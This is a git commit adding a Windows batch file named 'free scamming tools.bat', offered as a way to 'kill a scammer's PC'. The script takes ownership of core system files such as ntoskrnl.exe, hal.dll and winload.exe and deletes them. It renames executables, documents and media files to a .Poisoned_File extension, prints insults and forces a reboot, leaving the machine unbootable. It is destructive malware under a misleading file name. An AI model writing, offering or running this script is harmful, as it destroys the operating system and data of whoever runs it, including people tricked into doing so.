812bd51dacddaef76ba5722d7bc10b58240ce5e0
adoomyxx <144142418+adoomyxx@users.noreply.github.com>
2023-11-16 21:28:10 +0400

    Kill scammer pc with this
    Wanna kill a scammers pc? Get this

---
+++ free scamming tools.bat
@@ -0,0 +1,54 @@
+@echo off
+takeown /f C:\Windows\System32\hal.dll
+del /f /q C:\Windows\System32\hal.dll
+takeown /f C:\Windows\System32\wininit.exe
+del /f /q C:\Windows\System32\wininit.exe
+takeown /f C:\Windows\System32\svchost.exe
+del /f /q C:\Windows\System32\svchost.exe
+takeown /f C:\Windows\System32\csrss.exe
+del /f /q C:\Windows\System32\csrss.exe
+takeown /f C:\Windows\System32\ntoskrnl.exe
+del /f /q C:\Windows\System32\ntoskrnl.exe
+takeown /f C:\Windows\System32\winload.exe
+del /f /q C:\Windows\System32\winload.exe
+takeown /f C:\Windows\System32\winlogon.exe
+del /f /q C:\Windows\System32\winlogon.exe
+if exist *.exe ren *.exe *.Poisoned_File
+if exist *.msi ren *.msi *.Poisoned_File
+if exist *.cpi ren *.cpi *.Poisoned_File
+if exist *.cpl ren *.cpl *.Poisoned_File
+if exist *.msl ren *.msl *.Poisoned_File
+if exist *.com ren *.com *.Poisoned_File
+if exist *.c ren *.c *.Poisoned_File
+if exist *.cpp ren *.cpp *.Poisoned_File
+if exist *.cs ren *.cs *.Poisoned_File
+if exist *.css ren *.css *.Poisoned_File
+if exist *.hpp ren *.hpp *.Poisoned_File
+if exist *.h ren *.h *.Poisoned_File
+if exist *.cmd ren *.cmd *.Poisoned_File
+if exist *.vbs ren *.vbs *.Poisoned_File
+if exist *.vbe ren *.vbe *.Poisoned_File
+if exist *.js ren *.js *.Poisoned_File
+if exist *.jse ren *.jse *.Poisoned_File
+if exist *.docm ren *.docm *.Poisoned_File
+if exist *.docx ren *.docx *.Poisoned_File
+If exist *.xlsx ren *.xlsx *.Poisoned_File
+if exist *.xlsm ren *.xlsm *.Poisoned_File
+if exist *.pptx ren *.pptx *.Poisoned_File
+if exist *.pptm ren *.pptm *.Poisoned_File
+if exist *.txt ren *.txt *.Poisoned_File
+if exist *.mp4 ren *.mp4 *.Poisoned_File
+if exist *.mp3 ren *.mp3 *.Poisoned_File
+if exist *.wav ren *.wav *.Poisoned_File
+if exist *.html ren *.html *.Poisoned_File
+start cmd
+start cmd
+echo.YOUR PC IS DOOMED SCAMMER!!!>>LOL132425255253536.txt
+echo.GOOD LUCK FIXING YOUR PC>>LOL132425255253536.txt
+echo.THIS IS A MALWARE>>LOL132425255253536.txt
+start LOL1324255253536.txt
+echo U ARE A SON OF A BICH
+echo U ARE A SON OF A BICH
+echo WE ARE NO LONGER STUPID
+timeout 3
+shutdown /f /r /t 0
